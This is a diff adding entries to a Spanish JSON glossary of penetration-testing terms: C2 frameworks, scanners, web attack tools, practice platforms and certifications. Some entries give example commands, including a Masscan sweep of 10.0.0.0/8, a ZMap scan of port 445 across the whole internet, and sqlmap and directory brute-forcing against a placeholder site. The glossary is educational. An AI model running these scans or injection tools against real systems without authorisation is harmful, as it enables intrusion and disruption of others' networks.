+    "term": "Mythic",
+    "acronym": null,
+    "definition": "Framework C2 moderno y modular",
+    "example": "Mythic CLI",
+    "category": "Red Team",
+    "difficulty": "Alto",
+    "where_you_hear_it": "2021-actualidad"
+  },
+  {
+    "term": "Villain",
+    "acronym": null,
+    "definition": "C2 en Python",
+    "example": "villain.py",
+    "category": "Red Team",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Simple"
+  },
+  {
+    "term": "Merlin",
+    "acronym": null,
+    "definition": "C2 en Go con HTTP/2",
+    "example": "merlin server",
+    "category": "Red Team",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Moderno"
+  },
+  {
+    "term": "Nmap",
+    "acronym": null,
+    "definition": "Escáner de puertos y servicios",
+    "example": "nmap -sV -p- 10.10.10.10",
+    "category": "Reconocimiento",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Primera herramienta"
+  },
+  {
+    "term": "Masscan",
+    "acronym": null,
+    "definition": "Escáner ultra-rápido",
+    "example": "masscan -p1-65535 10.0.0.0/8 --rate=100000",
+    "category": "Reconocimiento",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Escaneo masivo"
+  },
+  {
+    "term": "ZMap",
+    "acronym": null,
+    "definition": "Escáner de internet a escala",
+    "example": "zmap -p 445 0.0.0.0/0",
+    "category": "Reconocimiento",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Investigación"
+  },
+  {
+    "term": "Shodan",
+    "acronym": null,
+    "definition": "Buscador de dispositivos conectados",
+    "example": "shodan search \"port:3389\"",
+    "category": "Reconocimiento",
+    "difficulty": "Alto",
+    "where_you_hear_it": "OSINT"
+  },
+  {
+    "term": "Censys",
+    "acronym": null,
+    "definition": "Alternativa a Shodan",
+    "example": "censys.io",
+    "category": "Reconocimiento",
+    "difficulty": "Alto",
+    "where_you_hear_it": "OSINT"
+  },
+  {
+    "term": "Burp Suite",
+    "acronym": null,
+    "definition": "Proxy y suite web",
+    "example": "Repeater, Intruder, Scanner",
+    "category": "Web",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Estándar web pentest"
+  },
+  {
+    "term": "ZAP",
+    "acronym": null,
+    "definition": "OWASP ZAP proxy gratuito",
+    "example": "zap.sh",
+    "category": "Web",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Gratuito"
+  },
+  {
+    "term": "sqlmap",
+    "acronym": null,
+    "definition": "Inyección SQL automática",
+    "example": "sqlmap -u http://site.com/id=1",
+    "category": "Web",
+    "difficulty": "Alto",
+    "where_you_hear_it": "SQLi"
+  },
+  {
+    "term": "Dirb",
+    "acronym": null,
+    "definition": "Fuerza bruta de directorios",
+    "example": "dirb http://site.com wordlist",
+    "category": "Web",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Clásico"
+  },
+  {
+    "term": "Gobuster",
+    "acronym": null,
+    "definition": "Más rápido que dirb",
+    "example": "gobuster dir -u site -w common.txt",
+    "category": "Web",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Actual"
+  },
+  {
+    "term": "FFUF",
+    "acronym": null,
+    "definition": "El más rápido",
+    "example": "ffuf -u https://site/FUZZ -w wordlist",
+    "category": "Web",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Estándar actual"
+  },
+  {
+    "term": "Nikto",
+    "acronym": null,
+    "definition": "Escáner de vulnerabilidades web",
+    "example": "nikto -h site.com",
+    "category": "Web",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Clásico"
+  },
+  {
+    "term": "Nuclei",
+    "acronym": null,
+    "definition": "Escáner rápido con templates",
+    "example": "nuclei -u site.com",
+    "category": "Web",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Proyecto actual"
+  },
+  {
+    "term": "OpenVAS",
+    "acronym": null,
+    "definition": "Escáner de vulnerabilidades",
+    "example": "openvas-start",
+    "category": "Red",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Gratuito"
+  },
+  {
+    "term": "Nessus",
+    "acronym": null,
+    "definition": "Escáner comercial",
+    "example": "Tenable Nessus",
+    "category": "Red",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Estándar empresa"
+  },
+  {
+    "term": "Qualys",
+    "acronym": null,
+    "definition": "Escáner en la nube",
+    "example": "qualys.com",
+    "category": "Red",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Empresas grandes"
+  },
+  {
+    "term": "Metasploitable",
+    "acronym": null,
+    "definition": "Máquina vulnerable para practicar",
+    "example": "Metasploitable 2/3",
+    "category": "Laboratorio",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Clásico"
+  },
+  {
+    "term": "TryHackMe",
+    "acronym": null,
+    "definition": "Plataforma de aprendizaje",
+    "example": "tryhackme.com",
+    "category": "Aprendizaje",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Mejor para principiantes"
+  },
+  {
+    "term": "HackTheBox",
+    "acronym": null,
+    "definition": "Plataforma de máquinas reales",
+    "example": "hackthebox.com",
+    "category": "Práctica",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Intermedio-avanzado"
+  },
+  {
+    "term": "PortSwigger Academy",
+    "acronym": null,
+    "definition": "Laboratorios web gratuitos",
+    "example": "portswigger.net/web-security",
+    "category": "Web",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Mejor para web"
+  },
+  {
+    "term": "VulnHub",
+    "acronym": null,
+    "definition": "Máquinas vulnerables para descargar",
+    "example": "vulnhub.com",
+    "category": "Práctica",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Clásico"
+  },
+  {
+    "term": "PentesterLab",
+    "acronym": null,
+    "definition": "Cursos y labs",
+    "example": "pentesterlab.com",
+    "category": "Aprendizaje",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Pago pero excelente"
+  },
+  {
+    "term": "INE",
+    "acronym": null,
+    "definition": "Cursos avanzados",
+    "example": "elearnsecurity.com",
+    "category": "Aprendizaje",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Certificaciones"
+  },
+  {
+    "term": "OffSec",
+    "acronym": null,
+    "definition": "OSCP, OSEP, OSWE",
+    "example": "offsec.com",
+    "category": "Certificaciones",
+    "difficulty": "Crítico",
+    "where_you_hear_it": "La biblia del pentesting"
+  },
+  {
+    "term": "SANS",
+    "acronym": null,
+    "definition": "Cursos caros pero excelentes",
+    "example": "sans.org",
+    "category": "Certificaciones",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Empresas"
+  },
+  {
+    "term": "CompTIA Security+",
+    "acronym": null,
+    "definition": "Certificación de entrada",
+    "example": "SY0-601/701",
+    "category": "Certificaciones",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Primera certificación"
+  },
+  {
+    "term": "CEH",
+    "acronym": null,
+    "definition": "Certified Ethical Hacker",
+    "example": "eccouncil.org",
+    "category": "Certificaciones",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Controvertida"
+  },
+  {
+    "term": "CISSP",
+    "acronym": "Certified Information Systems Security Professional",
+    "definition": "Certificación avanzada de gestión de seguridad",
+    "example": "ISC2 CISSP",
+    "category": "Certificaciones",
+    "difficulty": "Muy alto",
+    "where_you_hear_it": "Estándar de oro para gerencia"
+  }
+]
